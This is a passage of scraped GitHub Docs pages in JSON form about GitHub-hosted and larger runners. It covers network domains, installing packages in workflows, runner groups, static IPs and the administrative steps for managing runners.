      {
        "type": "heading",
        "level": 2,
        "text": "IP addresses"
      },
      {
        "type": "paragraph",
        "text": "To get a list of IP address ranges that GitHub Actions uses for GitHub-hosted runners, you can use the GitHub REST API. For more information, see theactionskey in the response of theGET /metaendpoint. For more information, seeREST API endpoints for meta data."
      },
      {
        "type": "paragraph",
        "text": "Windows and Ubuntu runners are hosted in Azure and subsequently have the same IP address ranges as the Azure datacenters. macOS runners are hosted in GitHub's own macOS cloud."
      },
      {
        "type": "paragraph",
        "text": "Since there are so many IP address ranges for GitHub-hosted runners, we do not recommend that you use these as allowlists for your internal resources. Instead, we recommend you use larger runners with a static IP address range, or self-hosted runners. For more information, seeUsing larger runnersorAbout self-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "The list of GitHub Actions IP addresses returned by the API is updated once a week."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Communication requirements for GitHub-hosted runners"
      },
      {
        "type": "paragraph",
        "text": "A GitHub-hosted runner must establish connections to GitHub-owned endpoints to perform essential communication operations. In addition, your runner may require access to additional networks that you specify or utilize within an action."
      },
      {
        "type": "paragraph",
        "text": "To ensure proper communications for GitHub-hosted runners between networks within your configuration, ensure that the following communications are allowed."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Some of the domains listed are configured usingCNAMErecords. Some firewalls might require you to add rules recursively for allCNAMErecords. Note that theCNAMErecords might change in the future, and that only the domains listed will remain constant."
      },
      {
        "type": "paragraph",
        "text": "Needed for essential operations:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "github.com\napi.github.com\n*.actions.githubusercontent.com"
      },
      {
        "type": "paragraph",
        "text": "Needed for downloading actions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "codeload.github.com\npkg.actions.githubusercontent.com"
      },
      {
        "type": "paragraph",
        "text": "Needed for publishing immutable actions:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "ghcr.io"
      },
      {
        "type": "paragraph",
        "text": "Needed for uploading/downloading job summaries, logs, workflow artifacts, and caches:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "results-receiver.actions.githubusercontent.com\n*.blob.core.windows.net"
      },
      {
        "type": "paragraph",
        "text": "Needed for runner version updates:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "objects.githubusercontent.com\nobjects-origin.githubusercontent.com\ngithub-releases.githubusercontent.com\ngithub-registry-files.githubusercontent.com"
      },
      {
        "type": "paragraph",
        "text": "Needed for retrieving OIDC tokens:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "*.actions.githubusercontent.com"
      },
      {
        "type": "paragraph",
        "text": "Needed for downloading or publishing packages or containers to GitHub Packages:"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "*.pkg.github.com\npkg-containers.githubusercontent.com\nghcr.io"
      },
      {
        "type": "paragraph",
        "text": "Needed for Git Large File Storage"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "github-cloud.githubusercontent.com\ngithub-cloud.s3.amazonaws.com"
      },
      {
        "type": "paragraph",
        "text": "Needed for jobs for Dependabot updates"
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "dependabot-actions.githubapp.com"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Theetc/hostsfile"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners are provisioned with anetc/hostsfile that blocks network access to various cryptocurrency mining pools and malicious sites. Hosts such as MiningMadness.com and cpu-pool.com are rerouted to localhost so that they do not present a significant security risk."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "File systems"
      },
      {
        "type": "paragraph",
        "text": "GitHub executes actions and shell commands in specific directories on the virtual machine. The file paths on virtual machines are not static. Use the environment variables GitHub provides to construct file paths for thehome,workspace, andworkflowdirectories."
      },
      {
        "type": "paragraph",
        "text": "For a list of the environment variables GitHub creates for each workflow, seeStore information in variables."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Docker container filesystem"
      },
      {
        "type": "paragraph",
        "text": "Actions that run in Docker containers have static directories under the/githubpath. However, we strongly recommend using the default environment variables to construct file paths in Docker containers."
      },
      {
        "type": "paragraph",
        "text": "GitHub reserves the/githubpath prefix and creates three directories for actions."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "/github/home",
          "/github/workspace-Note:GitHub Actions must be run by the default Docker user (root). Ensure your Dockerfile does not set theUSERinstruction, otherwise you will not be able to accessGITHUB_WORKSPACE.",
          "/github/workflow"
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Further reading"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Managing billing for GitHub Actions",
          "You can use a matrix strategy to run your jobs on multiple images. For more information, seeRunning variations of jobs in a workflow."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/using-github-hosted-runners/using-github-hosted-runners/customizing-github-hosted-runners",
    "content": [
      {
        "type": "paragraph",
        "text": "If you require additional software packages on GitHub-hosted runners, you can create a job that installs the packages as part of your workflow."
      },
      {
        "type": "paragraph",
        "text": "To see which packages are already installed by default, seeUsing GitHub-hosted runners."
      },
      {
        "type": "paragraph",
        "text": "This guide demonstrates how to create a job that installs additional software on a GitHub-hosted runner."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing software on Ubuntu runners"
      },
      {
        "type": "paragraph",
        "text": "The following example demonstrates how to install anaptpackage as part of a job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Build on Ubuntu\non: push\n\njobs:\n  build:\n    runs-on: ubuntu-latest\n    steps:\n      - name: Check out repository code\n        uses: actions/checkout@v4\n      - name: Install jq tool\n        run: |\n          sudo apt-get update\n          sudo apt-get install jq"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Always runsudo apt-get updatebefore installing a package. In case theaptindex is stale, this command fetches and re-indexes any available packages, which helps prevent package installation failures."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing software on macOS runners"
      },
      {
        "type": "paragraph",
        "text": "The following example demonstrates how to install Brew packages and casks as part of a job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Build on macOS\non: push\n\njobs:\n  build:\n    runs-on: macos-latest\n    steps:\n      - name: Check out repository code\n        uses: actions/checkout@v4\n      - name: Install GitHub CLI\n        run: |\n          brew update\n          brew install gh\n      - name: Install Microsoft Edge\n        run: |\n          brew update\n          brew install --cask microsoft-edge"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Installing software on Windows runners"
      },
      {
        "type": "paragraph",
        "text": "The following example demonstrates how to useChocolateyto install the GitHub CLI as part of a job."
      },
      {
        "type": "code",
        "language": "yaml",
        "content": "name: Build on Windows\non: push\njobs:\n  build:\n    runs-on: windows-latest\n    steps:\n      - run: choco install gh\n      - run: gh version"
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/using-github-hosted-runners/using-github-hosted-runners/monitoring-your-current-jobs",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing active jobs in your organization or enterprise"
      },
      {
        "type": "paragraph",
        "text": "You can get a list of all jobs currently running on GitHub-hosted runners in your organization or enterprise."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization or repository.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the \"Runners\" table, click the entry forGitHub-hosted runners. This entry will only be present if you're using GitHub-hosted runners.",
          "Review the \"Active jobs\" section, which contains a list of all jobs currently running on GitHub-hosted runners."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Viewing queued jobs in your organization or enterprise"
      },
      {
        "type": "paragraph",
        "text": "GitHub-hosted runners allow you to run jobs concurrently, and the maximum number of concurrent jobs will vary depending on your plan. If you reach the maximum number of concurrent jobs, any new jobs will start to enter a queue. To find out more about the number of concurrent jobs available to your plan, seeUsage limits, billing, and administration."
      },
      {
        "type": "paragraph",
        "text": "The following procedure demonstrates how to check the maximum number of concurrent jobs you can run."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization or repository.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the \"Runners\" table, click the entry forGitHub-hosted runners. This entry will only be present if you're using GitHub-hosted runners.",
          "Review the \"All jobs usage\" section, which lists the number of active jobs and the maximum number of jobs you can run."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/about-larger-runners",
    "content": [
      {
        "type": "heading",
        "level": 2,
        "text": "Overview of larger runners"
      },
      {
        "type": "paragraph",
        "text": "Customers on GitHub Team and GitHub Enterprise Cloud plans can choose from a range of managed virtual machines that have more resources than thestandard GitHub-hosted runners. These machines are referred to as \"larger runner.\" They offer the following advanced features:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "More RAM, CPU, and disk space",
          "Static IP addresses",
          "Azure private networking",
          "The ability to group runners",
          "Autoscaling to support concurrent workflows",
          "GPU-powered runners"
        ]
      },
      {
        "type": "paragraph",
        "text": "These larger runners are hosted by GitHub and have the runner application and other tools preinstalled."
      },
      {
        "type": "paragraph",
        "text": "GitHub offers larger runners with macOS, Ubuntu, or Windows operating systems, and different features and sizes are available depending on which operating system you use. For more information, seeAdditional features for larger runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "About Ubuntu and Windows larger runners"
      },
      {
        "type": "paragraph",
        "text": "Larger runners with Ubuntu or Windows operating systems are configured in your organization or enterprise. When you add a larger runner, you are defining a type of machine from a selection of available hardware specifications and operating system images. GitHub will then create multiple instances of this runner that scale up and down to match the job demands of your organization, based on the autoscaling limits you define. For more information, seeManaging larger runners."
      },
      {
        "type": "paragraph",
        "text": "Ubuntu and Windows larger runners offer autoscaling capabilities and the ability to assign the runners static IP addresses from a specific range. They can also be managed using runner groups, which enables you to control access to the larger runners. For more information, seeAdditional features for larger runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "About macOS larger runners"
      },
      {
        "type": "paragraph",
        "text": "Larger runners with a macOS operating system are used by updating the YAML workflow label to the desired runner image. To run your workflows on a macOS larger runner, update theruns-onkey to use one of the GitHub-defined macOS larger runner labels. No additional configuration is required. For more information, seeRunning jobs on larger runners."
      },
      {
        "type": "paragraph",
        "text": "The following machines sizes are available for macOS larger runners."
      },
      {
        "type": "heading",
        "level": 4,
        "text": "Limitations for macOS larger runners"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "All actions provided by GitHub are compatible with arm64 GitHub-hosted runners. However, community actions may not be compatible with arm64 and need to be manually installed at runtime.",
          "Nested-virtualization and Metal Performance Shaders (MPS) are not supported due to the limitation of Apple's Virtualization Framework.",
          "Networking capabilities such as Azure private networking and assigning static IPs are not currently available for macOS larger runners.",
          "The arm64 macOS runners do not have a static UUID/UDID assigned to them because Apple does not support this feature. However, Intel MacOS runners are assigned a static UDID, specifically4203018E-580F-C1B5-9525-B745CECA79EB. If you are building and signing on the same host you plan to test the build on, you can sign with adevelopment provisioning profile. If you do require a static UDID, you can use Intel runners and add their UDID to your Apple Developer account."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Additional features for larger runners"
      },
      {
        "type": "paragraph",
        "text": "Compared to standard GitHub-hosted runners, larger runners have additional features, and their availability varies depending on the larger runner's operating system."
      },
      {
        "type": "paragraph",
        "text": "These features can enhance your CI/CD pipelines in the following ways."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Assigning larger runners static IP addresses from a specific range enables you to use this range to configure a firewall allowlist. For more information, seeNetworking for larger runners.",
          "Autoscaling enables larger runners to scale up to a maximum limit set by you, so your workflows can run concurrently. For more information, seeAutoscaling larger runners.",
          "Runner groups allow you to control access to larger runners for your organizations, repositories, and workflows. For more information, seeControlling access to larger runners."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Runner images"
      },
      {
        "type": "paragraph",
        "text": "Larger runners run on virtual machines (VMs), and GitHub installs a virtual hard disk (VHD) on this machine during the VM creation process. You can choose from different VM images to install on your runners."
      },
      {
        "type": "paragraph",
        "text": "GitHub-owned images:These images are maintained by GitHub and are available for Linux x64, Windows x64, and macOS (x64 and arm) runners. For more information on these images and a full list of included tools for each runner operating system, see theGitHub Actions Runner Imagesrepository."
      },
      {
        "type": "paragraph",
        "text": "Partner Images:Partner images are not managed by GitHub and are pulled from the Azure Marketplace. See below for resources on where to find more information and to report issues for partner images."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Base Windows 11 desktop image.",
          "NVIDIA GPU-Optimized VMI",
          "Data Science Virtual Machine - Windows 2019.",
          "arm64 images:actions/partner-runner-imagesrepository."
        ]
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Understanding billing"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Larger runners are not eligible for the use of included minutes on private repositories. For both private and public repositories, when larger runners are in use, they will always be billed at the per-minute rate."
      },
      {
        "type": "paragraph",
        "text": "Compared to standard GitHub-hosted runners, larger runners are billed differently. Larger runners are only billed at the per-minute rate for the amount of time workflows are executed on them. There is no cost associated with creating a larger runner that is not being used by a workflow. For more information, seeAbout billing for GitHub Actions."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Machine sizes for larger runners"
      },
      {
        "type": "paragraph",
        "text": "You can choose from several specifications for larger runners."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Specifications for general larger runners"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The 4-vCPU Windows runner only works with the Windows Server 2025 or the Base Windows 11 Desktop image."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Specifications for GPU larger runners"
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About runner groups"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Only larger runners with Linux or Windows operating systems can be assigned to runner groups."
      },
      {
        "type": "paragraph",
        "text": "Runner groups enable administrators to control access to runners at the organization and enterprise levels. With runner groups, you can collect sets of runners and create a security boundary around them. You can then decide which organizations or repositories are permitted to run jobs on those sets of machines. During the larger runner deployment process, the runner can be added to an existing group, otherwise it will join a default group. You can create a group by following the steps inControlling access to larger runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Architectural overview of larger runners"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "This architecture diagram only applies to larger runners with Linux or Windows operating systems."
      },
      {
        "type": "paragraph",
        "text": "Larger runners are managed at the organization level, where they are arranged into groups that can contain multiple instances of the runner. They can also be created at the enterprise level and shared with organizations in the hierarchy. Once you've created a group, you can then add a runner to the group and update your workflows to target either the group name or the label assigned to the larger runner. You can also control which repositories are permitted to send jobs to the group for processing. For more information about groups, seeControlling access to larger runners."
      },
      {
        "type": "paragraph",
        "text": "In the following diagram, a class of hosted runner namedubuntu-20.04-16corehas been defined with customized hardware and operating system configuration."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Instances of this runner are automatically created and added to a group calledgrp-ubuntu-20.04-16core.",
          "The runners have been assigned the labelubuntu-20.04-16core.",
          "Workflow jobs use theubuntu-20.04-16corelabel in theirruns-onkey to indicate the type of runner they need to execute the job.",
          "GitHub Actions checks the runner group to see if your repository is authorized to send jobs to the runner.",
          "The job runs on the next available instance of theubuntu-20.04-16corerunner."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Autoscaling larger runners"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Autoscaling is only available for larger runners with Linux or Windows operating systems."
      },
      {
        "type": "paragraph",
        "text": "Larger runners can automatically scale to suit your needs. You can provision machines to run a specified maximum number of jobs when jobs are submitted for processing. Each machine only handles one job at a time, so these settings effectively determine the number of jobs that can be run concurrently."
      },
      {
        "type": "paragraph",
        "text": "You can configure the maximum job concurrency, which allows you to control your costs by setting the maximum parallel number of jobs that can be run using this set. A higher value here can help avoid workflows being blocked due to parallelism. For more information on how to set limits, seeManaging larger runners. For more information on the maximum auto-scaling limits for GitHub-hosted runners, seeUsage limits, billing, and administration."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Assigning static IP addresses to larger runners"
      },
      {
        "type": "paragraph",
        "text": "You can assign static IP addresses only to larger runners that use Linux or Windows operating systems."
      },
      {
        "type": "paragraph",
        "text": "Static IP addresses assigned are all usable and are not in CIDR notation."
      },
      {
        "type": "paragraph",
        "text": "Private networking for GitHub-hosted runners does not support static IP addresses for larger runners. For more information about private networking for GitHub-hosted runners, seeAbout Azure private networking for GitHub-hosted runners in your enterprise."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Networking for larger runners"
      },
      {
        "type": "paragraph",
        "text": "By default, larger runners receive a dynamic IP address that changes for each job run. Optionally, GitHub Enterprise Cloud customers can configure their larger runners to receive static IP addresses from GitHub's IP address pool. For more information, seeAbout GitHub's IP addresses."
      },
      {
        "type": "paragraph",
        "text": "When enabled, instances of the larger runner will receive IP addresses from specific ranges that are unique to the runner, allowing you to use the ranges to configure a firewall allowlist. You can use up to 10 larger runners with static IP address ranges in total across all your larger runners. For more information, seeManaging larger runners."
      },
      {
        "type": "paragraph",
        "text": "If you would like to use more than 10 larger runners with static IP address ranges, please contact us through theGitHub Support portal."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "If runners are unused for more than 30 days, their IP address ranges are automatically removed and cannot be recovered."
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/controlling-access-to-larger-runners",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The information and instructions in this article only apply to larger runners with Linux and Windows operating systems."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "About runner groups"
      },
      {
        "type": "paragraph",
        "text": "To control access to runners at the organization level, organizations using the GitHub Team plan can use runner groups. Runner groups are used to collect sets of runners and create a security boundary around them."
      },
      {
        "type": "paragraph",
        "text": "When you grant access to a runner group, you can see the runner group listed in the organization's runner settings. Optionally, you can assign additional granular repository access policies to the runner group."
      },
      {
        "type": "paragraph",
        "text": "When new runners are created, they are automatically assigned to the default group unless otherwise specified. Runners can only be in one group at a time. You can move runners from one runner group to another. For more information, seeMoving a runner to a group."
      },
      {
        "type": "paragraph",
        "text": "For information on how to route jobs to runners in a specific group, seeChoosing the runner for a job."
      },
      {
        "type": "heading",
        "level": 3,
        "text": "Managing access to your runners"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "Before your workflows can send jobs to larger runners, you must first configure permissions for the runner group. See the following sections for more information."
      },
      {
        "type": "paragraph",
        "text": "Runner groups are used to control which repositories can run jobs on your larger runners. You must manage access to the group from each level of the management hierarchy, depending on where you've defined the larger runner:"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "Runners at the enterprise level:By default, repositories in an organization do not have access to enterprise-level runner groups. To give repositories access to enterprise runner groups, organization owners must configure each enterprise runner group and choose which repositories have access.",
          "Runners at the organization level:By default, all repositories in an organization are granted access to organization-level runner groups. To restrict which repositories have access, organization owners must configure organization runner groups and choose which repositories have access."
        ]
      },
      {
        "type": "paragraph",
        "text": "For example, the following diagram has a runner group namedgrp-ubuntu-20.04-16coreat the enterprise level. Before the repository namedocto-repocan use the runners in the group, you must first configure the group at the enterprise level to allow access to theocto-orgorganization. You must then configure the group at the organization level to allow access toocto-repo."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Creating a runner group for an organization"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "If you are using a Fixed IP range, we recommend that you only use larger runners with private repositories. Forks of your repository can potentially run dangerous code on your larger runner by creating a pull request that executes the code in a workflow."
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "When creating a runner group, you must choose a policy that defines which repositories have access to the runner group. To change which repositories and workflows can access the runner group, organization owners can set a policy for the organization. For more information, seeEnforcing policies for GitHub Actions in your enterprise."
      },
      {
        "type": "paragraph",
        "text": "All organizations have a single default runner group. Organization owners using the GitHub Team plan can create additional organization-level runner groups."
      },
      {
        "type": "paragraph",
        "text": "If no group is specified during the registration process, runners are automatically added to the default group. You can later move the runner from the default group to a custom group. For more information, seeMoving a runner to a group."
      },
      {
        "type": "paragraph",
        "text": "For information about how to create a runner group with the REST API, seeREST API endpoints for GitHub Actions."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunner groups.",
          "In the \"Runner groups\" section, clickNew runner group.",
          "Enter a name for your runner group.",
          "Assign a policy for repository access.You can configure a runner group to be accessible to a specific list of repositories, or to all repositories in the organization. By default, only private repositories can access runners in a runner group, but you can override this. This setting can't be overridden if configuring an organization's runner group that was shared by an enterprise.",
          "ClickCreate groupto create the group and apply the policy."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Changing which repositories can access a runner group"
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "If you are using a Fixed IP range, we recommend that you only use larger runners with private repositories. Forks of your repository can potentially run dangerous code on your larger runner by creating a pull request that executes the code in a workflow."
      },
      {
        "type": "paragraph",
        "text": "For runner groups in an organization, you can change what repositories in the organization can access a runner group."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization where your runner groups are located.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunner groups.",
          "In the list of groups, click the runner group you'd like to configure.",
          "Under \"Repository access,\" use the dropdown menu to clickSelected repositories.To the right of the dropdown menu, click.In the popup, use the checkboxes to select repositories that can access this runner group.",
          "To the right of the dropdown menu, click.",
          "In the popup, use the checkboxes to select repositories that can access this runner group.",
          "ClickSave group."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Configuring private network access for larger runners"
      },
      {
        "type": "paragraph",
        "text": "You can use GitHub-hosted runners in an Azure VNET. This enables you to use GitHub-managed infrastructure for CI/CD while providing you with full control over the networking policies of your runners. For more information about Azure VNET, seeWhat is Azure Virtual Network?in the Azure documentation."
      },
      {
        "type": "paragraph",
        "text": "If you have configured your organization to connect to an Azure VNET, you can give runner groups access to the virtual network. For more information, seeAbout private networking with GitHub-hosted runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Changing the name of a runner group"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization where your runner groups are located.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunner groups.",
          "In the list of groups, click the runner group you'd like to configure.",
          "Enter the new runner group name in the text field under \"Group name.\"",
          "ClickSave."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Moving a runner to a group"
      },
      {
        "type": "paragraph",
        "text": "If you don't specify a runner group during the registration process, your new runners are automatically assigned to the default group, and can then be moved to another group."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the \"Runners\" list, click the runner that you want to configure.",
          "Select theRunner groupdrop-down.",
          "In \"Move runner to group\", choose a destination group for the runner."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Removing a runner group"
      },
      {
        "type": "paragraph",
        "text": "In order to remove a runner group, you must first move or remove all of the runners from the group."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization where your runner groups are located.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunner groups.",
          "In the list of groups, to the right of the group you want to delete, click.",
          "To remove the group, clickRemove group.",
          "Review the confirmation prompts, and clickRemove this runner group."
        ]
      }
    ]
  },
  {
    "url": "https://docs.github.com/en/actions/using-github-hosted-runners/using-larger-runners/managing-larger-runners",
    "content": [
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "The information and instructions in this article only apply to larger runners with Linux and Windows operating systems."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Adding a larger runner to an organization"
      },
      {
        "type": "paragraph",
        "text": "Organization owners can add a larger runner to an organization control which repositories can use it. When you create a new runner for an organization, by default, all repositories in the organization have access to the runner. To limit which repositories can use the runner, assign it to a runner group with access to specific repositories. For more information, seeAllowing repositories to access larger runners."
      },
      {
        "type": "paragraph",
        "text": "You can choose an operating system and a hardware configuration from the list of available options. When new instances of this runner are deployed through autoscaling, they'll use the same operating system and hardware configuration you've defined here."
      },
      {
        "type": "paragraph",
        "text": "New runners are automatically assigned to the default group, or you can choose which group the runners must join during the runner creation process. In addition, you can modify the runner's group membership after you've registered the runner. For more information, seeControlling access to larger runners."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "ClickNew runner, then clickNew GitHub-hosted runner.",
          "Complete the required details to configure your new runner:Name:Enter a name for your new runner. For easier identification, this should indicate its hardware and operating configuration, such asubuntu-20.04-16core.Platform:Choose a platform from the available options. Once you've selected a platform, you will be able to choose a specific image.Image:Choose an image from the available options. Once you've selected an image, you will be able to choose a specific size.GitHub-owned:For images managed by GitHub, select an image under this tab.Partner:For images managed by a partner, select an image under this tab. ex: Base Windows 11 desktop, GPU-optimized, and arm64 images are located under this tab.Size:Choose a hardware configuration from the list of available options. The available sizes depend on the image that you selected in a previous step. For GPU runners, select a size under theGPU-poweredtab.Maximum concurrency:Choose the maximum number of jobs that can be active at any time.Runner group:Choose the group that your runner will be a member of. This group will host multiple instances of your runner, as they scale up and down to suit demand.NoteThe names of larger runners can dictate their functionality. For example, to use a larger runner for code scanning default setup, the runner must be namedcode-scanning. For more information on code scanning with larger runners, seeConfiguring larger runners for default setup.",
          "Name:Enter a name for your new runner. For easier identification, this should indicate its hardware and operating configuration, such asubuntu-20.04-16core.",
          "Platform:Choose a platform from the available options. Once you've selected a platform, you will be able to choose a specific image.",
          "Image:Choose an image from the available options. Once you've selected an image, you will be able to choose a specific size.GitHub-owned:For images managed by GitHub, select an image under this tab.Partner:For images managed by a partner, select an image under this tab. ex: Base Windows 11 desktop, GPU-optimized, and arm64 images are located under this tab.",
          "GitHub-owned:For images managed by GitHub, select an image under this tab.",
          "Partner:For images managed by a partner, select an image under this tab. ex: Base Windows 11 desktop, GPU-optimized, and arm64 images are located under this tab.",
          "Size:Choose a hardware configuration from the list of available options. The available sizes depend on the image that you selected in a previous step. For GPU runners, select a size under theGPU-poweredtab.",
          "Maximum concurrency:Choose the maximum number of jobs that can be active at any time.",
          "Runner group:Choose the group that your runner will be a member of. This group will host multiple instances of your runner, as they scale up and down to suit demand.",
          "ClickCreate runner.",
          "To allow repositories to access your larger runners, add them to the list of repositories that can use it. For more information, seeAllowing repositories to access larger runners."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Allowing repositories to access larger runners"
      },
      {
        "type": "paragraph",
        "text": "Repositories are granted access to larger runners through runner groups. Enterprise administrators can choose which organizations are granted access to enterprise-level runner groups, and organization owners control repository-level access to all larger runners."
      },
      {
        "type": "paragraph",
        "text": "Organization owners can use and configure enterprise-level runner groups for the repositories in their organization, or they can create organization-level runner groups to control access."
      },
      {
        "type": "list",
        "ordered": false,
        "items": [
          "For enterprise-level runner groups:By default, repositories in an organization do not have access to enterprise-level runner groups. To give repositories access to enterprise runner groups, organization owners must configure each enterprise runner group and choose which repositories have access.",
          "For organization-level runner groups:By default, all repositories in an organization are granted access to organization-level runner groups. To restrict which repositories have access, organization owners must configure organization runner groups and choose which repositories have access."
        ]
      },
      {
        "type": "paragraph",
        "text": "Once a repository has access to larger runners, the larger runners can be added to workflow files. For more information, seeRunning jobs on larger runners."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "Navigate to the main page of the organization where your runner groups are located.",
          "ClickSettings.",
          "In the left sidebar, clickActions, then clickRunner groups.",
          "Select a runner group from either list on the page. Organization-level runner groups are listed at the top of the page, and enterprise-level runner groups are listed under \"Shared by the Enterprise.\"",
          "On the runner group page, under \"Repository access,\" selectAll repositoriesorSelected repositories. If you choose to grant access to specific repositories, click, then select the repositories you would like to grant access to from the list."
        ]
      },
      {
        "type": "paragraph",
        "text": "Warning"
      },
      {
        "type": "paragraph",
        "text": "If you are using a Fixed IP range, we recommend that you only use larger runners with private repositories. Forks of your repository can potentially run dangerous code on your larger runner by creating a pull request that executes the code in a workflow.\nFor more information, seeControlling access to larger runners."
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Changing the name of a larger runner"
      },
      {
        "type": "paragraph",
        "text": "Note"
      },
      {
        "type": "paragraph",
        "text": "The names of larger runners can dictate their functionality. For example, to use a larger runner for code scanning default setup, the runner must be namedcode-scanning. For more information on code scanning with larger runners, seeConfiguring larger runners for default setup."
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
          "Under your organization name, clickSettings. If you cannot see the \"Settings\" tab, select thedropdown menu, then clickSettings.",
          "In the left sidebar, clickActions, then clickRunners.",
          "In the list of runners, select the runner you would like to edit.",
          "Enter a new name for the runner in the text field under \"Name.\"",
          "ClickSave."
        ]
      },
      {
        "type": "heading",
        "level": 2,
        "text": "Changing the size of a larger runner"
      },
      {
        "type": "list",
        "ordered": true,
        "items": [
          "On GitHub, navigate to the main page of the organization.",
